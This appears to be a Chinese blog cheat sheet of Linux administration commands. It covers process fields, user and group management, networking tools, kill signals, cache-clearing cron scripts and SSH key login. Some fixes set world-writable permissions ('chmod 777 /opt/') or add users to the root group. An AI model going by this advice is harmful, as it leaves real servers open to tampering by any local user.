<code>TIME</code>：进程使用的CPU时间总计，单位秒
<code>TIME+</code>：进程使用的CPU时间总计，单位1/100秒
<code>%MEM</code>：进程使用的物理内存百分比
<code>VIRT</code>：进程使用的虚拟内存总量，单位kb，VIRT = SWAP + RES
<code>SWAP</code>：进程使用的虚拟内存中，被换出的大小，单位kb
<code>RES</code>：进程使用的、未被换出的物理内存大小,单位kb，RES = CODE + DATA
<code>CODE</code>：可执行代码占用的物理内存大小，单位kb
<code>DATA</code>：可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kb
<code>SHR</code>：共享内存大小，单位kb
<code>nFLT</code>：页面错误次数
<code>nDRT</code>：最后一次写入到现在，被修改过的页面数</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>S：进程状态
</span></span><span style="display:flex;"><span>D=不可中断的睡眠状态
</span></span><span style="display:flex;"><span>R=运行
</span></span><span style="display:flex;"><span>S=睡眠
</span></span><span style="display:flex;"><span>T=跟踪/停止
</span></span><span style="display:flex;"><span>Z=僵尸进程
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>COMMAND</code>：命令名/命令行
<code>WCHAN</code>：若该进程在睡眠,则显示睡眠中的系统函数名
<code>Flags</code>：任务标志,参考 sched.h</p>
<p>默认情况下仅显示比较重要的
<code>PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND</code></p>
<p>可以通过下面的快捷键来更改显示内容：
更改显示内容通过f键可以选择显示的内容（按f键之后会显示列的列表，按 a-z即可显示或隐藏对应的列，最后按回车键确定）
按o键可以改变列的显示顺序（按小写的a-z可以将相应的列向右移动，而大写的A-Z可以将相应的列向左移动，最后按回车键确定）
按大写的F或O键，然后按a-z可以将进程按照相应的列进行排序，而大写的R键可以将当前的排序倒转。</p>
<h2 id="用户管理">用户管理<a hidden class="anchor" aria-hidden="true" href="#用户管理">#</a></h2>
<p>要掌握的常用命令：useradd, passwd, su。</p>
<h3 id="groupadd">groupadd<a hidden class="anchor" aria-hidden="true" href="#groupadd">#</a></h3>
<p>groupadd命令用于创建新的用户组。语法格式：<code>groupadd 组名</code>
例如：
<code>[root@localhost]# groupadd mygroup</code></p>
<h3 id="groupdel">groupdel<a hidden class="anchor" aria-hidden="true" href="#groupdel">#</a></h3>
<p>groupdel命令用于删除用户组。语法格式：<code>groupdel 组名</code>
例如：
<code>[root@localhost]# groupdel mygroup</code></p>
<h3 id="groups">groups<a hidden class="anchor" aria-hidden="true" href="#groups">#</a></h3>
<p>groups命令用于显示当前用户所在的组。 例如：
<code>[root@localhost]# groups</code></p>
<h3 id="useradd">useradd<a hidden class="anchor" aria-hidden="true" href="#useradd">#</a></h3>
<p>useradd命令用于建立用户帐号。主要参数-c：加上备注文字，备注文字保存在passwd 的备注栏中。
-d：指定用户登入时的启始目录。
-D：变更预设值。
-e：指定账号的有效期限，缺省表示永久有效。
-f：指定在密码过期后多少天即关闭该账号。
-g：指定用户所属的群组。
-G：指定用户所属的附加群组。
-m：自动建立用户的登入目录。
-M：不要自动建立用户的登入目录。
-n：取消建立以用户名称为名的群组。
-r：建立系统账号。
-s：指定用户登入后所使用的 shell。
-u：指定用户ID 号。
添加用户：<code>useradd newuser</code>
添加用户，指定相关参数，建立test用户，并把此用户加入root组：
<code>useradd -m -d /home/share -g root test</code></p>
<h3 id="userdel">userdel<a hidden class="anchor" aria-hidden="true" href="#userdel">#</a></h3>
<p>userdel命令用来删除用户帐号及其相关文件。 例如：
<code>[root@localhost]# userdel newuser</code></p>
<h3 id="passwd">passwd<a hidden class="anchor" aria-hidden="true" href="#passwd">#</a></h3>
<p>passwd(password)命令用于修改用户的密码。一般来说，设置账户密码失败有几种情况：密码太简单、密码太短、密码中的字符多数相同。
语法格式：passwd 用户名 修改密码，命令如下：
<code>[root@localhost]# passwd newuser</code></p>
<h3 id="usermod">usermod<a hidden class="anchor" aria-hidden="true" href="#usermod">#</a></h3>
<p>usermod可用来修改用户帐号的各项设定。可以用来设定用户归属哪个组。 例如使得test用户加入mail组：
<code>[root@localhost]# usermod -G mail test</code></p>
<h3 id="su">su<a hidden class="anchor" aria-hidden="true" href="#su">#</a></h3>
<p>切换到user用户：<code>[root@localhost]# su user</code>
切换到 root 用户：<code>[root@localhost]# su</code></p>
<h3 id="who">who<a hidden class="anchor" aria-hidden="true" href="#who">#</a></h3>
<p>查看当前计算机有哪些用户登录</p>
<h3 id="whoami">whoami<a hidden class="anchor" aria-hidden="true" href="#whoami">#</a></h3>
<p>查看当前用户的登录名。</p>
<h2 id="网络管理">网络管理<a hidden class="anchor" aria-hidden="true" href="#网络管理">#</a></h2>
<p>需掌握的常用命令：ping, netstat, ftp,ssh, telnet, wget</p>
<h3 id="finger-需要安装">finger (需要安装)<a hidden class="anchor" aria-hidden="true" href="#finger-需要安装">#</a></h3>
<p>finger需要安装才可以使用
<code>yum install finger</code>
finger用来查询一台主机上的登录账号的信息，通常会显示用户名、主目录、 停滞时间、登录时间、登录Shell等信息，使用权限为所有用户。
命令格式：<code>finger [选项] [使用者] [用户@主机]</code></p>
<p>主要参数说明：
-s：显示用户注册名、实际姓名、终端名称、写状态、停滞时间、登录时间等信息。
-l：除了用-s选项显示的信息外，还显示用户主目录、登录 Shell、邮件状态等信息，以及用户主目录下的.plan、.project和.forward文件的内容。
-p：除了不显示.plan文件和.project文件以外，与-l选项相同。</p>
<p>应用实例：
su(switch user)命令可以使得当前用户切换到另一个用户。如果要退出切换后的用户登录，可以执行exit命令。
直接键入如下命令：
<code>finger</code>
<code>finger root</code></p>
<p>查询远程机上的用户信息应用说明：
如果要查询远程机上的用户信息，需要在用户名后面接“@主机名”，采用[用户名@主机名]的格式，不过要查询的网络主机需要运行finger守护进程的支持。</p>
<h3 id="ftp">ftp<a hidden class="anchor" aria-hidden="true" href="#ftp">#</a></h3>
<p>该命令是标准的文件传输协议的用户接口，是在 TCP/IP 网络上传输文件最简单有效的方法。</p>
<h3 id="hostname">hostname<a hidden class="anchor" aria-hidden="true" href="#hostname">#</a></h3>
<p>该命令用于显示或设置系统的主机名。</p>
<h3 id="netstat">netstat<a hidden class="anchor" aria-hidden="true" href="#netstat">#</a></h3>
<p>netstat命令用于显示网络连接、路由表和网络接品信息，用户可以知道目前有哪些网络连接正在运行。常用选项有：
<code>-a</code>：显示所有socket，包括正在监听的。
<code>-c</code>：每隔1秒钟就重新显示一遍网络信息，直到用户中断它。
<code>-l</code>：仅列出有在 Listen (监听) 的服务状态，格式同 “ifconfig -e”命令。
<code>-n</code>：以 IP 地址代替名称，显示网络连接信息。
<code>-r</code>：显示核心路由表，格式同“route -e”命令。
<code>-t</code>：显示 TCP 协议的连接信息。
<code>-u</code>：显示 UDP 协议的连接信息。
<code>-v</code>：显示正在进行的网络协议。</p>
<p>应用示例：
列出所有端口：<code>netstat -a</code>
通过管道方式查看每一页内容：<code>netstat -a|more</code>
列出所有tcp端口：<code>netstat -at</code>
列出所有udp端口：<code>netstat -au</code>
列出监听端口：<code>netstat -l</code>
列出所有监听tcp端口：<code>netstat -lt</code>
列出所有监听udp端口：<code>netstat -lu</code>
查看80是否被占用：<code>netstat -l|grep 80</code></p>
<h3 id="ping">ping<a hidden class="anchor" aria-hidden="true" href="#ping">#</a></h3>
<p>ping命令可用来测试计算机和网络上的其他计算机是否连通。 例如测试本机和192.168.1.2那台机器是否连通：
<code>[root@localhost]# ping 192.168.1.2</code></p>
<h3 id="ssh">ssh<a hidden class="anchor" aria-hidden="true" href="#ssh">#</a></h3>
<p>ssh命令(安全的 Shell)用于通过网络登录远程计算机，如同操作本地计算机一样。命令格式：
<code>ssh 用户@服务器IP地址</code>
例如使用root用户登录到192.168.1.2上：<code>ssh root@192.168.1.2</code>
然后根据系统提示，输入登录的用户名和密码。还有一个rsh命令和ssh命令功能类似，常用的是ssh。ssh和rsh的区别：
安全级别不同，ssh的密码等都是加密传输，而且还有密钥认证的机制，而rsh是明文传输，而且没有密钥的机制。</p>
<h3 id="telnet不建议使用">telnet(不建议使用)<a hidden class="anchor" aria-hidden="true" href="#telnet不建议使用">#</a></h3>
<p>telnet命令用于通过网络登录远程计算机，如同操作本地计算机一样。和ssh命令功能类似。ssh和telnet区别：ssh是加密的。telnet是明码传输的，发送的数据被监听后不需要解密就能看到内容。现在不建议使用telnet。</p>
<h3 id="wget">wget<a hidden class="anchor" aria-hidden="true" href="#wget">#</a></h3>
<p>wget命令用于Linux环境下从www上下载文件，支持 HTTP和FTP协议，支持代理服务器和断点续传功能，能够自动递归远程主机的目录，查找合乎要求的文件并下载到本地硬盘上，wget 命令可在后台运行，截获并忽略HANGUP信号，因此在用户退出登录之后，仍可继续运行。
例如：<code>wget http：//url/filename</code></p>
<h3 id="ifconfig">ifconfig<a hidden class="anchor" aria-hidden="true" href="#ifconfig">#</a></h3>
<p>可以查看网卡的IP地址。
例如：<code>[root@localhost]# ifconfig</code>
也可以临时修改IP，重启系统后，恢复原始IP。</p>
<h3 id="查看本机ip">查看本机ip<a hidden class="anchor" aria-hidden="true" href="#查看本机ip">#</a></h3>
<p><code>curl ident.me</code></p>
<h2 id="进程管理">进程管理<a hidden class="anchor" aria-hidden="true" href="#进程管理">#</a></h2>
<p>常用命令：ps, kill。</p>
<h3 id="ps">ps<a hidden class="anchor" aria-hidden="true" href="#ps">#</a></h3>
<p>ps命令用于显示程序的状态。 例如查找所有进程：<code>ps -aux</code>
命令常用选项：
命令格式：<code>ifconfig IP 地址 netmask 子网掩码</code>
-a：显示所有用户的所有进程(包括其它用户)。
<code>-x</code>：显示没有控制终端的进程，同时显示各个命令的具体路径。
<code>-u</code>：按用户名和启动时间的顺序来显示进程。
<code>-aux</code>：显示所有包含其他使用者的进程。</p>
<p>STAT，状态，分别表示的含意：
D：不可中断的静止
R：正在执行中
S：静止状态
T：暂停执行
Z：不存在但暂时无法消除
W：没有足够的记忆体分页可分配&lt;：高优先序的行程
N：低优先序的行程
L：有记忆体分页分配并锁在记忆体内(即时系统或A I/O)</p>
<p>应用举例：
使用管道和more连用，进行分页查看：
<code>[root@localhost ~]# ps -aux |more</code>
使用管道和grep连用，在进程中查找指定进程。
例如查找Tomcat进程：<code>ps -aux|grep tomcat</code></p>
<p>注意事项：如果有两条查询结果，则说明Tomcat已经启动，如果没有，则Tomcat没有启动。如果只查询出一条结果，并且以“grep tomcat”结尾，则此进程不是Tomcat进程，而是查找进程。</p>
<p>把查询到的进程导出到文件：
<code>[root@localhost ~]# ps -aux &gt; tmp.txt</code></p>
<h3 id="kill">kill<a hidden class="anchor" aria-hidden="true" href="#kill">#</a></h3>
<p>该命令用于终止一个程序。
一般用法格式：<code>kill PID</code>
PID是指进程ID。例如杀掉进程号为2629的进程：<code>kill 2629</code>
向进程发送信号的方式，杀进程命令格式：<code>kill -s signal PID</code>
signal是指关闭PID所指定的进程时发送的信号，PID是指进程ID。例如通过上面的进程查到Tomcat的进程ID是2629，要杀死此进程的命令：
<code>[root@localhost ~]# kill -s SIGINT 2629</code>
或者写成：
<code>[root@localhost ~]# kill -INT 2629</code>
或者写成：
<code>[root@localhost ~]# kill -2 2629</code>
使用信号数字杀掉进程：
signal也可以使用对应的数字代替，例如上面的命令可以写成：
<code>kill -2 2629</code>
常用的几个信号(signal，可通过 kill -l 命令信号有哪些，及信号与数字对应关系)：
<code>SIG信号-对应数字-说明</code>
SIGINT-2：这个就是在shell下用Ctrl+C来结束一个程序时，发送的信号，进程收到这个程序会结束。你可以用<code>kill -INT pid</code>来发这个信号。
SIGQUIT-3：这个是在shell下用Ctrl+\ 来结束程序时，发送的信号，
SIGKILL-9：这个信号之所以被称为“强杀”，就是因为无法改变进程收到这个信号后所执行的动作，进程只能退出。(前面说的两个信号，虽然默认是退出，但是应用程序自己可以通过signal系统调用来修改成其他动作，比如忽略那两个信号等动作)。
SIGTERM-15：程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理。通常用来要求程序自己正常退出</p>
<p>一般情况下使用最多的是强杀：
<code>kill -9 2629</code></p>
<h2 id="服务管理">服务管理<a hidden class="anchor" aria-hidden="true" href="#服务管理">#</a></h2>
<h3 id="service">service<a hidden class="anchor" aria-hidden="true" href="#service">#</a></h3>
<p>Service命令用于启动、停止、重启服务程序。
启动服务命令：<code>service 服务名 start </code>
停止服务命令：<code>service 服务名 stop </code>
重启服务命令：<code>service 服务名 restart</code>，在Centos系统中，该指令推荐使用systemctl替代它。</p>
<p>例如要启动 VSFTP 服务器：
<code>[root@localhost ~]# service vsftpd start</code>
例如要停止 VSFTP 服务器：
<code>[root@localhost ~]# service vsftpd stop</code>
使用systemctl命令如下：
<code>systemctl start vsftpd</code>
<code>systemctl stop vsftpd</code></p>
<h1 id="常用命令实战">常用命令实战<a hidden class="anchor" aria-hidden="true" href="#常用命令实战">#</a></h1>
<h2 id="linux新建组用户赋权">Linux新建组、用户、赋权<a hidden class="anchor" aria-hidden="true" href="#linux新建组用户赋权">#</a></h2>
<p><code>useradd</code>：获取命令帮助
<code>useradd -G {groupName} userName</code>：新建用户添加到指定组（附加组），同时还会创建一个与用户同名的主组
<code>grep groupName /etc/group</code>：查找组
<code>groupadd groupName</code>：创建组
<code>passwd userName</code>：为用户修改密码
<code>useradd -g {groupName} userName</code>：新建用户添加到组并指定该组为主组（登录组）
<code>usermod -a -G groupName userName</code>：追加用户到某个组
<code>usermod -g groupName userName</code>：修改某个用户主组为某个组
<code>gpasswd -d userName groupName</code>：将某个用户从某个组立删除
<code>chmod -R 777</code>：修改某个文件或目录读写权限7-xwr 6-xw 5-xr 3-wr 1-r 文件/目录拥有者权限-组群权限-其他人权限
<code>chown -R userName{：groupName} 文件/目录</code>：修改文件/目录的所有者（组群）</p>
<h2 id="查看文件夹大小">查看文件夹大小<a hidden class="anchor" aria-hidden="true" href="#查看文件夹大小">#</a></h2>
<p><code>du -h 文件夹名</code></p>
<h2 id="查看端口占用情况">查看端口占用情况<a hidden class="anchor" aria-hidden="true" href="#查看端口占用情况">#</a></h2>
<p><code>netstat -tunlp | grep 端口号</code>
<code>netstat -nltp | grep 端口号</code>
两个使用方式一致</p>
<h2 id="linux-ssh多台主机免密登录">Linux ssh多台主机免密登录<a hidden class="anchor" aria-hidden="true" href="#linux-ssh多台主机免密登录">#</a></h2>
<p>首先使用root登录，执行：
<code>ssh-keygen</code>：生成ssh公钥私钥
<code>ssh-copy-id -i /用户名/.ssh/id_rsa.pub root@ip或host</code>：将密钥发送到对方主机，输入密码后即可实现免密码登录
<code>ssh ip或host</code>：使用ssh登录对方主机
<code>scp -r root@ip或者host：文件或者目录路径 本地路径</code>：将远程目录或者文件复制到本地</p>
<h2 id="查看服务器的配置">查看服务器的配置<a hidden class="anchor" aria-hidden="true" href="#查看服务器的配置">#</a></h2>
<ul>
<li>
<p>总核数 = 物理CPU个数 X 每颗物理CPU的核数</p>
</li>
<li>
<p>总逻辑CPU数 = 物理CPU个数 X 每颗物理CPU的核数 X 超线程数</p>
</li>
<li>
<p>查看物理CPU个数
<code>cat /proc/cpuinfo| grep &quot;physical id&quot;| sort| uniq| wc -l</code></p>
</li>
<li>
<p>查看每个物理CPU中core的个数(即核数)
<code>cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq</code></p>
</li>
<li>
<p>查看逻辑CPU的个数
<code>cat /proc/cpuinfo| grep &quot;processor&quot;| wc -l</code></p>
</li>
<li>
<p>查看CPU信息（型号）
<code>cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</code></p>
</li>
<li>
<p>查看Linux内核版本命令
<code>cat /proc/version</code>
<code>uname -a</code></p>
</li>
<li>
<p>查看Linux系统版本的命令
<code>lsb_release -a</code> 这个命令适用于所有的Linux发行版</p>
</li>
</ul>
<h1 id="其他">其他<a hidden class="anchor" aria-hidden="true" href="#其他">#</a></h1>
<h2 id="解决linux-buffercache内存占用过高">解决Linux buffer/cache内存占用过高<a hidden class="anchor" aria-hidden="true" href="#解决linux-buffercache内存占用过高">#</a></h2>
<p>经常用free命令来查看系统内存的使用状态：
<code>free -m</code></p>
<p>我们还可以使用下面这个文件来人工触发缓存清除的操作：
<code>cat /proc/sys/vm/drop_caches</code>
默认是0</p>
<p>方法是：
<code>echo 1 &gt; /proc/sys/vm/drop_caches</code></p>
<p>当然，这个文件可以设置的值分别为1、2、3。它们所表示的含义为：
echo 1 &gt; /proc/sys/vm/drop_caches：表示清除pagecache。
echo 2 &gt; /proc/sys/vm/drop_caches：表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。
echo 3 &gt; /proc/sys/vm/drop_caches：表示清除pagecache和slab分配器中的缓存对象。</p>
<p><a href="%E5%8F%82%E8%80%83%E5%9C%B0%E5%9D%80">https://www.cnblogs.com/rocky-AGE-24/p/7629500.html</a></p>
<h2 id="linux查看硬盘使用情况">linux查看硬盘使用情况<a hidden class="anchor" aria-hidden="true" href="#linux查看硬盘使用情况">#</a></h2>
<p><code>df -hl</code></p>
<h2 id="磁盘占用过大">磁盘占用过大<a hidden class="anchor" aria-hidden="true" href="#磁盘占用过大">#</a></h2>
<p>目前发现占用磁盘过大的有：</p>
<ul>
<li>jenkins</li>
<li>docker</li>
</ul>
<h2 id="centos7设置定时清除buffcache的脚本">Centos7设置定时清除buff/cache的脚本<a hidden class="anchor" aria-hidden="true" href="#centos7设置定时清除buffcache的脚本">#</a></h2>
<p>最近发现<code>buff/cache</code>持续缓慢上升，慢慢把服务器64G的内存都吃掉了，还没发现是谁产生的问题，只能先写个清除缓存的脚本解决一下。
切换到root用户
<code>su -root</code></p>
<p>创建脚本文件
<code>touch cleanCache.sh</code>
<code>vim cleanCache.sh</code></p>
<p>添加如下内容：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span><span style="color:#007f7f">#每两小时清除一次缓存</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;开始清除缓存&#34;</span>
</span></span><span style="display:flex;"><span>sync;sync;sync <span style="color:#007f7f">#写入硬盘，防止数据丢失</span>
</span></span><span style="display:flex;"><span>sleep <span style="color:#ff0;font-weight:bold">10</span> <span style="color:#007f7f">#延迟10秒</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#ff0;font-weight:bold">3</span> &gt; /proc/sys/vm/drop_caches
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建定时任务
<code>crontab -e  //弹出配置文件</code></p>
<p>添加如下内容：（按需修改）
<code>0 */2 * * * ./cleanCache.sh</code></p>
<p>保证crond启动以及开机自启
<code>systemctl start crond.service</code>
<code>systemctl enable crond.service</code></p>
<p>查看buff/cache情况
<code>free -m</code></p>
<p>查看定时任务是否被执行
<code>cat /var/log/cron | grep cleanCache</code>
只要任务创建了，即使退出用户登录，任务还是会执行。
此方法清理缓存只是紧急临时用的，不建议在生产环境中使用此方法。</p>
<p>注意：此方法不能用于解决统物理内存占用过高，导致部分服务被强制关闭的问题
要从根本上解决服务器内存占用过高的问题，<a href="https://www.idaobin.com/archives/345.html">参考这篇文章</a></p>
<h2 id="ubuntu下使用filezilla上传文件失败的问题">ubuntu下使用filezilla上传文件失败的问题<a hidden class="anchor" aria-hidden="true" href="#ubuntu下使用filezilla上传文件失败的问题">#</a></h2>
<p><code>open for write: permission denied</code>
原因：用户没有上传文件到该目录下面的权限。
解决：使用以下命令给我们需要放入的目标文件权限，我这里是操作opt文件夹的权限，如果你要操作所有目录权限，把opt修改为home即可，命令如下：
<code>sudo chmod 777 /opt/</code>
试试能不能传，不能就重启服务器：
<code>sudo /etc/init.d/vsftpd restart</code></p>
<h2 id="apache下载文件">apache下载文件<a hidden class="anchor" aria-hidden="true" href="#apache下载文件">#</a></h2>
<ol>
<li>找到apache的安装目录，httpd目录</li>
<li>进入到conf.d目录下</li>
<li>删掉welcome.conf
<code>rm –rf welcome.conf</code></li>
<li>回到apache的安装目录下，进入到conf 文件夹下</li>
<li>查看httpd.conf文件(里面有默认访问页面的路径)
<code>vi httpd.conf</code>
找到这个：
<code>DocumentRoot &quot;/var/www/html&quot;</code>
这个是你apache默认的访问页面，进入到这个文件夹
这个文件夹下的内容会被显示到apahce的默认访问页里，把你想要下载的东西打包成压缩文件，传到这个文件夹下，就可以通过ip访问下载了。</li>
</ol>
<h2 id="磁盘满了">磁盘满了<a hidden class="anchor" aria-hidden="true" href="#磁盘满了">#</a></h2>
<p>nginx启动报错：
<code>nginx: [crit] pwrite() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (28: No space left on device)</code>
磁盘满了，查一下
<code>df -h</code></p>
<p>查看所有路径下大于100M的文件
<code>find / -size +100M |xargs ls -lh</code>
大部分情况是因为某些日志把磁盘写满了。</p>
<p>清空文件内容几种方式：
<code>echo &gt; filename</code>
<code>echo &quot;&quot; &gt; filename</code>
<code>&gt; filename</code>
<code>: &gt; filename</code>
<code>cat /dev/null &gt; filename</code></p>
<h2 id="nohup-java--jar-xxxxjar-">nohup java -jar xxxx.jar &amp;<a hidden class="anchor" aria-hidden="true" href="#nohup-java--jar-xxxxjar-">#</a></h2>
<p>直接用java -jar xxx.jar，当退出或关闭shell时，程序就会停止掉。
<code>java -jar xxx.jar &amp;</code>
<code>nohup java -jar xxxx.jar &amp;</code></p>
<h1 id="通过密钥登陆linux">通过密钥登陆linux<a hidden class="anchor" aria-hidden="true" href="#通过密钥登陆linux">#</a></h1>
<h2 id="制作密钥对">制作密钥对<a hidden class="anchor" aria-hidden="true" href="#制作密钥对">#</a></h2>
<p>首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：
<code>ssh-keygen</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Generating public/private rsa key pair.
</span></span><span style="display:flex;"><span>Enter file in which to save the key (/root/.ssh/id_rsa): &lt;== 按 Enter
</span></span><span style="display:flex;"><span>Created directory &#39;/root/.ssh&#39;.
</span></span><span style="display:flex;"><span>Enter passphrase (empty for no passphrase): &lt;== 输入密钥锁码，或直接按 Enter 留空
</span></span><span style="display:flex;"><span>Enter same passphrase again: &lt;== 再输入一遍密钥锁码
</span></span><span style="display:flex;"><span>Your identification has been saved in /root/.ssh/id_rsa. &lt;== 私钥
</span></span><span style="display:flex;"><span>Your public key has been saved in /root/.ssh/id_rsa.pub. &lt;== 公钥
</span></span><span style="display:flex;"><span>The key fingerprint is:
</span></span><span style="display:flex;"><span>0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 当前 用户的家目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。id_rsa 为私钥，id_rsa.pub 为公钥。</p>
<h2 id="在服务器上安装公钥">在服务器上安装公钥<a hidden class="anchor" aria-hidden="true" href="#在服务器上安装公钥">#</a></h2>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd .ssh
</span></span><span style="display:flex;"><span>cat id_rsa.pub &gt;&gt; authorized_keys
</span></span></code></pre></td></tr></table>
</div>
</div><p>如此便完成了公钥的安装。为了确保连接成功，请保证以下文件权限正确：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chmod 600 authorized_keys
</span></span><span style="display:flex;"><span>chmod 700 ~/.ssh
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="设置-ssh打开密钥登录功能">设置 SSH，打开密钥登录功能<a hidden class="anchor" aria-hidden="true" href="#设置-ssh打开密钥登录功能">#</a></h2>
<p>编辑 /etc/ssh/sshd_config 文件
<code>vim /etc/ssh/sshd_config</code></p>
